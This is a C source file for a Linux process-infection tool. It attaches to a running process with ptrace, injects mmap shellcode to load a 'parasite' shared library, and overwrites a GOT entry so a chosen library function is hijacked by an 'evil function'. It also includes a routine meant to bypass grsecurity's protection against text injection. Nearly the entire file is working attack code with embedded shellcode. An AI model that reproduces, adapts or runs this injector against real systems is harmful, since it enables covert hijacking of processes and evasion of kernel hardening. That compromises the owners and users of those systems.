#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <elf.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <dlfcn.h>

typedef unsigned char bool;
#define false 0
#define true 1

#define ERROR(fmt, args...) fprintf(stderr, "ERROR: " fmt "\n", ##args);
#define ERR_EXIT_FAIL(fmt, args...)  \
	do { \
		fprintf(stderr, "ERROR: " fmt "\n", ##args); \
		exit(EXIT_FAILURE); \
	} while (0);

#define ERR_EXIT_SUCC(fmt, args...) \
	do { \
		fprintf(stderr, "ERROR: " fmt "\n", ##args); \
		exit(EXIT_SUCCESS); \
	} while (0);

#define MAXBUF 255
#define LIBC "/lib/libc.so.6"

/* memrw() request to modify global offset table */
#define MODIFY_GOT 1

/* memrw() request to patch parasite */
/* with original function address */
#define INJECT_TRANSFER_CODE 2

// TODO option
#define EVILLIB "libparasite.so.0.1"
#define EVILLIB_FULLPATH "/lib/libparasite.so.0.1"

/* should be getting lib mmap size dynamically */
/* from map file; this #define is temporary */
#define LIBSIZE 5472 

/* struct to get symbol relocation info */
struct linking_info
{
        char name[256];
        int index;
        int count;
        uint32_t offset;
};

struct segments
{
    unsigned long text_off;
    unsigned long text_len;
    unsigned long data_off;
    unsigned long data_len;
} segment;
unsigned long original;
extern int getstr;

unsigned long text_base;
unsigned long data_segment;
char static_sysenter = 0; 

/*
_start:
        jmp B
A:

        # fd = open("libtest.so.1.0", O_RDONLY);

        xorl %ecx, %ecx
        movb $5, %al
        popl %ebx
        xorl %ecx, %ecx
        int $0x80

        subl $24, %esp

        # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);

        xorl %edx, %edx
        movl %edx, (%esp)
        movl $8192,4(%esp)
        movl $7, 8(%esp)
        movl $2, 12(%esp)
        movl %eax,16(%esp)
        movl %edx, 20(%esp)
        movl $90, %eax
        movl %esp, %ebx
        int $0x80

        int3
B:
        call A
        .string "/lib/libtest.so.1.0"
*/

/* make sure to put your shared lib in /lib and name it libtest.so.1.0 */
static char mmap_shellcode[] = 
    "\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec"
        "\x18\x31\xd2\x89\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44"
        "\x24\x08\x07\x00\x00\x00\xc7\x44\x24\x0c\x02\x00\x00\x00\x89\x44"
        "\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89\xe3\xcd\x80\xcc"
        "\xe8\xc0\xff\xff\xff\x2f\x6c\x69\x62\x2f\x6c\x69\x62\x74\x65\x73"
        "\x74\x2e\x73\x6f\x2e\x31\x2e\x30\x00";

/* the signature for our evil function in our shared object */ 
/* we use the first 8 bytes of our function code */
/* make sure this is modified based on your parasite (evil function) */ 
//unsigned char evilsig[] = "\x55\x89\xe5\x83\xec\x38\xc6\x45";
// TODO: autogen
static unsigned char evilsig[] = "\x55\x89\xe5\x83\xec\x18\xe8\xfc";

/* here is the signature for our transfer code, this will vary */
/* depending on whether or not you use a function pointer or a */
/* mov/jmp sequence. The one below is for a function pointer */
static unsigned char tc[] = "\xc7\x45\xf8\x00";



unsigned long evil_base;

/*  
 * Our memrw() function serves three purposes
 *    1. modify .got entry with replacement function
 *    2. patch transfer code within replacement function
 *    3. read from any text memory location in process
 */
static unsigned long 
memrw (unsigned long *buf, 
       unsigned long vaddr, 
       unsigned int size, 
       int pid, 
       unsigned long new)
{
    int i, j, data;

    /* get the memory address of the function to hijack */
    if (size == MODIFY_GOT && !buf) {
	printf("Modifying GOT (%lx)\n", vaddr);
	original = (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
	ptrace(PTRACE_POKETEXT, pid, vaddr, new);
	return (unsigned long)ptrace(PTRACE_PEEKTEXT, pid, vaddr);
    } else if(size == INJECT_TRANSFER_CODE) { 
        printf("Injecting %lx at 0x%lx\n", new, vaddr);
        ptrace(PTRACE_POKETEXT, pid, vaddr, new);
    
        j = 0;
        vaddr--;
        for (i = 0; i < 2; i++) {
            data = ptrace(PTRACE_PEEKTEXT, pid, (vaddr + j));
            buf[i] = data;
            j += 4;
        }
        return 1;
    } else {
	printf("Reading from process image at 0x%lx\n", vaddr);
    }

    for (i = 0, j = 0; i < size; i+= sizeof(uint32_t), j++) {
	/* PTRACE_PEEK can return -1 on success, check errno */
	if(((data = ptrace(PTRACE_PEEKTEXT, pid, vaddr + i)) == -1) && errno)
	    return -1;
	buf[j] = data;
    }

    return i;
}


/* bypass grsec patch that prevents code injection into text */
static void
grsec_mmap_library (int pid)
{
    struct  user_regs_struct reg;
    long eip, esp, offset, eax, ebx, ecx, edx;
    int i, status, fd;
    char library_string[MAXBUF];
    char orig_ds[MAXBUF];
    char buf[MAXBUF] = {0};
    unsigned char tmp[8192];
    unsigned long sysenter = 0;

    memset(library_string, 0, MAXBUF);
    strcpy(library_string, EVILLIB_FULLPATH);
    
    /* backup first part of data segment which will use for a string and some vars */
    memrw((unsigned long *)orig_ds, 
	data_segment, 
	strlen(library_string)+32, 
	pid, 
	0);
    
    /* store our string for our evil lib there */
    for (i = 0; i < strlen(library_string); i += 4) {
        ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(library_string + i));
    }
    
    /* verify we have the correct string */
    for (i = 0; i < strlen(library_string); i+= 4) {
        *(long *)&buf[i] = ptrace(PTRACE_PEEKTEXT, pid, (data_segment + i));
    }
    
    if (strcmp(buf, EVILLIB_FULLPATH) == 0) {
        printf("Verified string is stored in DS: %s\n", buf);
    } else {
        fprintf(stderr, "String was not properly stored in DS: %s\n", buf);
	exit(EXIT_FAILURE);
    }
    
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);

    wait(NULL);

    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    eax = reg.eax;
    ebx = reg.ebx;
    ecx = reg.ecx;
    edx = reg.edx;
    eip = reg.eip;
    esp = reg.esp; 
    
    long syscall_eip = reg.eip - 20;
    
    /* this gets sysenter dynamically incase its randomized */
    if (!static_sysenter)
    {
            memrw((unsigned long *)tmp, syscall_eip, 20, pid, 0);
            for (i = 0; i < 20; i++)
            {
                    if (!(i % 10))
                            printf("\n");
                     printf("%.2x ", tmp[i]);
                     if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
                            sysenter = syscall_eip + i;
            }
    }
    /* this works only if sysenter isn't at random location */
    else {
        memrw((unsigned long *)tmp, 0xffffe000, 8192, pid, 0);
        for (i = 0; i < 8192; i++) {
            if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
                sysenter = 0xffffe000 + i;
        }
    }

    sysenter -= 5;

    if (!sysenter) {
        printf("Unable to find sysenter\n");
        exit(EXIT_FAILURE);
    }
    printf("Sysenter found: %lx\n", sysenter);   
    /*
     sysenter should point to: 
              push   %ecx
              push   %edx
              push   %ebp
              mov    %esp,%ebp
              sysenter 
    */

    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    wait(0);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
	    perror("ptrace_attach");
	    exit(EXIT_FAILURE);
    }

    waitpid(pid, &status, WUNTRACED);
    
    reg.eax = SYS_open;
    reg.ebx = (long)data_segment;
    reg.ecx = 0;  
    reg.eip = sysenter;
    
    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
        
    for (i = 0; i < 5; i++) {
        ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
        wait(NULL);
        ptrace(PTRACE_GETREGS, pid, NULL, &reg);
        if (reg.eax != SYS_open)
            fd = reg.eax;
    }
    offset = (data_segment + strlen(library_string)) + 8;

    reg.eip = sysenter;
    reg.eax = SYS_mmap;
    reg.ebx = offset;

    ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
    ptrace(PTRACE_POKETEXT, pid, offset + 4, segment.text_len + (PAGE_SIZE - (segment.text_len & (PAGE_SIZE - 1))));
    ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ|PROT
    ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
    ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
    ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.text_off & ~(PAGE_SIZE - 1));   

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);    
    
    for (i = 0; i < 5; i++) {
	ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
	wait(NULL);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);
        if (reg.eax != SYS_mmap)
            evil_base = reg.eax;
    }
    
    reg.eip = sysenter;
    reg.eax = SYS_mmap;
    reg.ebx = offset;

    ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
    ptrace(PTRACE_POKETEXT, pid, offset + 4, segment.data_len + (PAGE_SIZE - (segment.data_len & (PAGE_SIZE - 1))));
    ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ|PROT_WRITE
    ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);   // MAP_SHARED
    ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);   // fd
    ptrace(PTRACE_POKETEXT, pid, offset + 20, segment.data_off & ~(PAGE_SIZE - 1));    

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    for (i = 0; i < 5; i++) {
	ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
	wait(NULL);
    }

    printf("Restoring data segment\n");
    for (i = 0; i < strlen(library_string) + 32; i++) {
	ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long *)(orig_ds + i));
    }

    reg.eip = eip;
    reg.eax = eax;
    reg.ebx = ebx;
    reg.ecx = ecx;
    reg.edx = edx; 
    reg.esp = esp;

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
}


/* function to load our evil library */
static void 
mmap_library (int pid)
{
    struct user_regs_struct reg;
    long eip, esp, offset, 
	 eax, ebx, ecx, edx;
    int i, j = 0;
    unsigned long buf[30];
    unsigned char saved_text[94];
    unsigned char *p;

    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    eip = reg.eip;
    esp = reg.esp;
    eax = reg.eax;
    ebx = reg.ebx;
    ecx = reg.ecx;
    edx = reg.edx;

    offset = text_base;

    printf("%%eip -> 0x%lx\n", eip);
    printf("Injecting mmap_shellcode at 0x%lx\n", offset);

    /* were going to load our shellcode at base */
    /* first we must backup the original code into saved_text */
    for (i = 0; i < 90; i += 4)
	buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));

    p = (unsigned char *)buf;

    memcpy(saved_text, p, 90);

    printf("Here is the saved code we will be overwriting:\n");
    for (j = 0, i = 0; i < 90; i++) {
	if ((j++ % 20) == 0)
	    printf("\n");
	printf("\\x%.2x", saved_text[i]);
    }
    printf("\n");

    /* load shellcode into text starting at eip */
    for (i = 0; i < 90; i += 4)
	ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(mmap_shellcode + i));

    printf("\nVerifying shellcode was injected properly, does this look ok?\n");
    j = 0;

    for (i = 0; i < 90; i += 4)
	buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));

    p = (unsigned char *) buf;
    for (j = 0, i = 0; i < 90; i++) {
	if ((j++ % 20) == 0)
	    printf("\n");
	printf("\\x%.2x", p[i]);
    }

    printf("\n\nSetting %%eip to 0x%lx\n", offset);

    reg.eip = offset + 2;
    ptrace(PTRACE_SETREGS, pid, NULL, &reg);

    ptrace(PTRACE_CONT, pid, NULL, NULL);

    wait(NULL);
    /* check where eip is now at */ 
    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    printf("%%eip is now at 0x%lx, resetting it to 0x%lx\n", reg.eip, eip);
    printf("inserting original code back\n");

    for (j = 0, i = 0; i < 90; i += 4)
	buf[j++] = ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(saved_text + i));

    /* get base addr of our mmap'd lib */
    evil_base = reg.eax;

    reg.eip = eip;
    reg.eax = eax;
    reg.ebx = ebx;
    reg.ecx = ecx;
    reg.edx = edx;
    reg.esp = esp;

    ptrace(PTRACE_SETREGS, pid, NULL, &reg);

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
	perror("ptrace_detach");
	exit(EXIT_FAILURE);
    }
}

/* this parses/pulls the R_386_JUMP_SLOT relocation entries from our process */

static struct linking_info * 
get_plt (unsigned char *mem)
{
	Elf32_Ehdr *ehdr;
	Elf32_Shdr *shdr, *shdrp, *symshdr;
	Elf32_Sym *syms, *symsp;
	Elf32_Rel *rel;

	char *symbol;
	int i, j, symcount, k;

	struct linking_info *link;

	ehdr = (Elf32_Ehdr *)mem;
	shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);

	shdrp = shdr;

	for (i = ehdr->e_shnum; i-- > 0; shdrp++)
	{
		if (shdrp->sh_type == SHT_DYNSYM)
		{
			symshdr = &shdr[shdrp->sh_link];
			if ((symbol = malloc(symshdr->sh_size)) == NULL)
				goto fatal;
			memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);

			if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
				goto fatal;

			memcpy((Elf32_Sym *)syms, (Elf32_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
			symsp = syms;

			symcount = (shdrp->sh_size / sizeof(Elf32_Sym));
			link = (struct linking_info *)malloc(sizeof(struct linking_info) * symcount);
			if (!link)
				goto fatal;

			link[0].count = symcount;
			for (j = 0; j < symcount; j++, symsp++)
			{
				strncpy(link[j].name, &symbol[symsp->st_name], sizeof(link[j].name)-1);
				if (!link[j].name)
					goto fatal;
				link[j].index = j;
			}
			break;
		}
	}
	for (i = ehdr->e_shnum; i-- > 0; shdr++)
	{
		switch(shdr->sh_type)
		{
			case SHT_REL:
				rel = (Elf32_Rel *)(mem + shdr->sh_offset);
				for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++)
				{
					for (k = 0; k < symcount; k++)
					{
						if (ELF32_R_SYM(rel->r_info) == link[k].index)
							link[k].offset = rel->r_offset;
					}
				}
				break;
			case SHT_RELA:
				break;

			default:
				break;
		}
	}

	return link;
fatal:
	return NULL;
}


static unsigned long 
search_evil_lib (int pid, unsigned long vaddr)
{
    unsigned char *buf;
    int i = 0, j = 0, c = 0; 
    unsigned long evilvaddr = 0;

    if ((buf = malloc(LIBSIZE)) == NULL)
    {
        perror("malloc");
        exit(-1);
    }

    memrw((unsigned long *)buf, vaddr, LIBSIZE, pid, 0);
    printf("Searching at library base [0x%lx] for evil function\n", vaddr);
    
    for (i = 0; i < LIBSIZE; i++) {
          if (buf[i] == evilsig[0] && buf[i+1] == evilsig[1] && buf[i+2] == evilsig[2] 
         && buf[i+3] == evilsig[3] && buf[i+4] == evilsig[4] && buf[i+5] == evilsig[5]
         && buf[i+6] == evilsig[6] && buf[i+7] == evilsig[7])
         {
            evilvaddr = (vaddr + i);
            break;
         }
    }
    
    c = 0;
    j = evilvaddr;
    printf("Parasite code ->\n");

    while (j++ < evilvaddr + 50)
    {
        if ((c++ % 20) == 0)
            printf("\n");
        printf("%.2x ", buf[i++]);
    }
    printf("\n");

    free(buf);
    if (evilvaddr)
        return (evilvaddr);
    return 0;
}

static int 
check_for_lib (char *lib, FILE *fd)
{
    char buf[MAXBUF];
    
    while(fgets(buf, MAXBUF-1, fd))
	    if (strstr(buf, lib))
		    return 1;
    return 0;
}

#define MEMINFO_MAX_SIZE 20

static void
usage (char ** argv)
{
	fprintf(stderr, "Usage: %s <pid> <function> [opts]\n"
			"-d  ET_DYN processes\n"
			"-g  bypass grsec binary flag restriction \n"
			"-2  Meant to be used as a secondary method of\n"
			"finding sysenter with -g; if -g fails, then add -2\n"
			"Example 1: %s <pid> <function> -g\n"
			"Example 2: %s <pid> <function> -g -2\n", argv[0],argv[0],argv[0]);

	exit(EXIT_SUCCESS);
}


static bool
is_valid_elf (unsigned char * mem, bool et_dyn)
{
	Elf32_Ehdr * ehdr = (Elf32_Ehdr*)mem;

	if (strncmp((const char*)ehdr->e_ident, "\x7F" "ELF", 4))
		return false;

	/* 
	 * we currently target executables only, 
     * although ET_DYN would be a viable target 
	 * as well.
 	 */
	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
		return false;

	// Target process is of type ET_DYN, but the '-d' option was not specified
	if (ehdr->e_type == ET_DYN && !et_dyn) 
		return false;

	return true;
}


// TODO: getopt
int 
main (int argc, char **argv)
{
	char meminfo[MEMINFO_MAX_SIZE], buf[MAXBUF], tmp[MAXBUF], *p, *file;
	char *function, grsec = 0;
	bool et_dyn = false;
	FILE *fd;
	uint32_t i;
	struct stat st;
	unsigned char *mem;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	Elf32_Addr got_offset, export, elf_base, dyn_mmap_got_addr;
	unsigned long evilfunc;
	struct linking_info *lp;
	int pid, md, status;

	if (argc < 3) 
		usage(argv);

	i = 0;

	while (argv[1][i] >= '0' && argv[1][i] <= '9')
		i++;

	if (i != strlen(argv[1]))
		usage(argv);

	if (argc > 3) {
		if (argv[3][0] == '-' && argv[3][1] == 'd')
			et_dyn = true;

		if (argv[3][0] == '-' && argv[3][1] == 'g')
			grsec = 1;
		if (argv[4] && !strcmp(argv[4], "-2"))
			static_sysenter = 1;
		else
			if (argv[4])
			{
				printf("Unrecognized option: %s\n", argv[4]);
				usage(argv);
			}

	}

	pid = atoi(argv[1]);
	if((function = strdup(argv[2])) == NULL) {
		perror("strdup");
		exit(-1);
	}

	snprintf(meminfo, sizeof(meminfo), "/proc/%d/maps", pid);

	if ((fd = fopen(meminfo, "r")) == NULL) {
		fprintf(stderr, "PID: %i cannot be checked, /proc/%i/maps does not exist\n", pid, pid);
		exit(EXIT_FAILURE);
	}

	/* ET_DYN */
	if (et_dyn) {
		while (fgets(buf, MAXBUF-1, fd)) {   
			if (strstr(buf, "r-xp") && !strstr(buf, ".so")) {

				strncpy(tmp, buf, MAXBUF-1);

				if ((p = strchr(buf, '-')))
					*p = '\0';

				text_base = strtoul(buf, NULL, 16);

				if (strchr(tmp, '/'))
					while (tmp[i++] != '/');
				else {
					fclose(fd);
					printf("error parsing pid map\n");
					exit(EXIT_FAILURE);
				}
				if ((file = strdup((char *)&tmp[i - 1])) == NULL)
				{
					perror("strdup");
					exit(EXIT_FAILURE);
				}      
				i = 0;  
				while (file[i++] != '\n');
				file[i - 1] = '\0';
				goto next;
			}
		}
	}

	/* ET_EXEC */
	fgets(buf, MAXBUF-1, fd);
	strncpy(tmp, buf, MAXBUF-1);

	if (strchr(tmp, '/'))
		while (tmp[i++] != '/');
	else
	{
		fclose(fd);
		printf("error parsing pid map\n");
		exit(-1);
	}
	if ((file = strdup((char *)&tmp[i - 1])) == NULL)
	{
		perror("strdup");
		exit(-1);
	}

	i = 0;
	while (file[i++] != '\n');
	file[i - 1] = '\0';

next: 

	if ((md = open(file, O_RDONLY)) == -1)
	{
		perror("open");
		exit(-1);
	}

	if (fstat(md, &st) < 0)
	{
		perror("fstat");
		exit(-1);
	}

	mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, md, 0);
	if (mem == MAP_FAILED)
	{
		perror("mmap");
		exit(-1);
	}

	ehdr = (Elf32_Ehdr*)mem;


	if (!is_valid_elf(mem, et_dyn))
		ERR_EXIT_FAIL("%s is not a valid ELF file", file);

	phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);

	/* get the base -- p_vaddr of text segment */
	for (i = ehdr->e_phoff; i-- > 0; phdr++)
	{
		if (phdr->p_type == PT_LOAD && !phdr->p_offset)
		{
			elf_base = text_base = phdr->p_vaddr;
			segment.text_off = phdr->p_offset;
			segment.text_len = phdr->p_filesz;
			phdr++;
			segment.data_off = phdr->p_offset;
			segment.data_len = phdr->p_filesz;
			data_segment = phdr->p_vaddr;
			break;
		}
	}

	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
		ERR_EXIT_FAIL("Could not attach to process");

	waitpid(pid, &status, WUNTRACED);

	/* get the symbol relocation information */
	if ((lp = (struct linking_info *)get_plt(mem)) == NULL) {
		printf("get_plt() failed\n");
		goto done;
	}

	/* inject mmap shellcode into process to load lib */
	if (check_for_lib(EVILLIB, fd) != 1) {
		printf("Injecting library\n");
		if (grsec)
			grsec_mmap_library(pid);
		else
			mmap_library(pid);
		if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
		{
			perror("ptrace_attach");
			exit(-1);
		}
		waitpid(pid, &status, WUNTRACED);
		fclose(fd);

		if ((fd = fopen(meminfo, "r")) == NULL)
		{
			printf("PID: %i cannot be checked, /proc/%i/maps does not exist\n", pid, pid);
			return -1;
		}
	}
	else
	{
		printf("Process %d appears to be infected, %s is mmap'd already\n", pid, EVILLIB);
		goto done;
	}

	if ((evilfunc = search_evil_lib(pid, evil_base)) == 0) {
		printf("Could not locate evil function\n");
		goto done;
	}


	printf("Evil Function location: %lx\n", evilfunc);
	printf("Modifying GOT entry: replace <%s> with %lx\n", function, evilfunc);

	/* overwrite GOT entry with addr to evilfunc (our replacement) */


	for (i = 0; i < lp[0].count; i++)
	{
		if (strcmp(lp[i].name, function) == 0)
		{
			if (et_dyn)
				dyn_mmap_got_addr = (evil_base + (lp[i].offset - elf_base));

			got_offset = (!et_dyn) ? lp[i].offset : dyn_mmap_got_addr;

			export = memrw(NULL, got_offset, 1, pid, evilfunc);
			if (export == evilfunc)
				printf("Successfully modified GOT entry\n\n");
			else
			{
				printf("Failed at modifying GOT entry\n");
				goto done;
			} 
			printf("New GOT value: %x\n", export);

		}
	}

	unsigned char evil_code[256];
	unsigned char initial_bytes[12];
	unsigned long injection_vaddr = 0;

	/* get a copy of our replacement function and search for transfer sequence */ 
	memrw((unsigned long *)evil_code, evilfunc, 256, pid, 0);

	/* once located, patch it with the addr of the original function */
	for (i = 0; i < 256; i++)
	{
		printf("%.2x ", evil_code[i]);
		if (evil_code[i] == tc[0] && evil_code[i+5] == tc[1] && evil_code[i+6] == tc[2] && evil_code[i+7] == tc[3])
		{
			printf("\nLocated transfer code; patching it with %lx\n", original);
			injection_vaddr = (evilfunc + i) + 3;
			break;
		}
	}

	if (!injection_vaddr)
	{
		printf("Could not locate transfer code within parasite\n");
		goto done;
	}

	/* patch jmp code with addr to original function */
	memrw((unsigned long *)initial_bytes, injection_vaddr, INJECT_TRANSFER_CODE, pid, original);

	printf("Confirm transfer code: ");
	for (i = 0; i < 7; i++)
		printf("\\x%.2x", initial_bytes[i]);
	puts("\n");

done:
	munmap(mem, st.st_size);
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
		perror("ptrace_detach");

	close(md);
	fclose(fd);
	exit(EXIT_SUCCESS);

	return 0;
}
